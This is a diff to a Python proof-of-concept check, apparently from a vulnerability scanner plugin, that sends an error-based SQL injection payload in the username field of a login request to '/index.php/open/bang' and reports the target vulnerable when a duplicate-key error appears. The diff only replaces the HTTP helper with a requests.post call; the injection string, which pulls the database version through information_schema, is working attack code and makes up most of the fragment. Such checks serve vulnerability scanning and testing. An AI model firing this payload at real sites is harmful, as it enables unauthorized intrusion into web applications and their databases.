@@ -35,9 +35,9 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             url = arg + "/index.php/open/bang"
             payload = "openid=x&denglu=login&username=a%27 and(select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1#&userpass=testvul"
-            code, head, res, errcode,finalurl = hh.http(url + " -d '" + payload +"'")
-                       
-            if res.find("for key 'group_key'") != -1:
+            req = requests.post(url, data=payload)
+            res = req.text
+            if res.find(r"for key 'group_key'") != -1:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
